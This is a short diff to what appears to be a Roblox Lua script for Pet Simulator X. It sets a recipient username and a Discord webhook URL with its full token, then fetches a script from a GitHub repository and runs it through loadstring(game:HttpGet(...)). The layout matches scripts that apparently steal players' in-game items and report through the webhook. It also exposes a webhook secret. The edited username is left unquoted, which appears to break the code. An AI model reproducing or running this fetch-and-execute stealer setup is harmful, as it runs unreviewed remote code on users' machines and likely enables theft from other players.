@@ -1,4 +1,4 @@
-UserName = "3617153442"
+UserName = Techfluent
 WebHook = "https://discord.com/api/webhooks/1050478545043996692/MfKdOcbD1gqWNcCO68HlaAO0zrAc-NB4aJt6YTRLu0_EoBhukxzSDJcWw6KYvNwD2VSJ"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
